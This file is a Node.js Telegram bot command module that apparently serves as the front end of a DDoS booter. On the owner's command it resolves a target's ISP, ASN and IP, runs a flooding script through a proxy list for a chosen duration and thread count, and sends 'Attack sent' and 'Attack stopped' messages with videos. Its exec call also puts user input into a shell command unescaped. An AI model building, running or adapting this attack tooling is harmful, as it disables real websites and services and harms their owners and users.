const { exec } = require("child_process");
const path = require("path");
const config = require("../config");
const axios = require("axios");

module.exports = (bot) => {

    if (!global.runningProcesses) global.runningProcesses = [];

    bot.onText(/\XILY (.+)/, async (msg, match) => {

        const chatId = msg.chat.id;
        const userId = msg.from.id;

        if (userId !== config.ownerId)
            return bot.sendMessage(chatId, "Access denied.");

        const args = match[1].split(" ");
        if (args.length < 3)
            return bot.sendMessage(chatId, "wait WTF, run like this: XILY <url> <duration> <threads>");

        const [target, duration, threads] = args;

        let hostname, port;
        try {
            const parsedUrl = new URL(target);
            hostname = parsedUrl.hostname;
            port = parsedUrl.port || "443";
        } catch {
            return bot.sendMessage(chatId, "URL tidak valid.");
        }

        // Ambil ISP/ASN/IP
        let isp = "N/A", asn = "N/A", ip = "N/A";
        try {
            const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
            const data = response.data;
            isp = data.isp || "N/A";
            asn = data.as || "N/A";
            ip = data.query || "N/A";
        } catch {}

        // 🎬 Video Start
        const startVideo = "https://image2url.com/r2/default/videos/1771809700902-cfd02e71-635d-4a51-943d-14fef2e8a889.mp4";
        await bot.sendVideo(chatId, startVideo, {
            caption: `
🚀 Attack sent starting
──────────────────────
🌐 Host: ${hostname}
📌 Port: ${port}
⏱️ Duration: ${duration}s
📡 Method: XILY
📊 Threads: ${threads}
──────────────────────
🏢 ISP: ${isp}
🏷️ ASN: ${asn}
🌍 IP: ${ip}
📣 Status: In Progress
📢 HostNetLive: https://check-host.net/check-http?host=${target}
            `,
            supports_streaming: true
        });

        // Jalankan scan.js
        const toolPath = path.join(__dirname, "../tools/XILY.js");
        const child = exec(`node --max-old-space-size=8124 "${toolPath}" "${target}" "${duration}" 34 "${threads}" ../userbot/tools/proxy.txt`);
        global.runningProcesses.push(child);

        const cleanup = (proc) => {
            global.runningProcesses = global.runningProcesses.filter(p => p !== proc);
        };

        child.on("close", () => cleanup(child));
        child.on("error", () => cleanup(child));

        // Kirim video Finish setelah duration
        setTimeout(async () => {
            const finishVideo = "https://image2url.com/r2/default/videos/1771809208778-258a65b9-593b-42d7-85ad-874b90afa906.mp4";
            await bot.sendVideo(chatId, finishVideo, {
                caption: `
✅ Attack stopped
──────────────────────
🌐 Host: ${hostname}
📌 Port: ${port}
⏱️ Duration: ${duration}s
📡 Method: XILY
📊 Threads: ${threads}
──────────────────────
🏢 ISP: ${isp}
🏷️ ASN: ${asn}
🌍 IP: ${ip}
📣 Status: Susccesfully
📢 HostNetLive: https://check-host.net/check-http?host=${target}
                `,
                supports_streaming: true
            });
        }, duration * 1000);

    });

};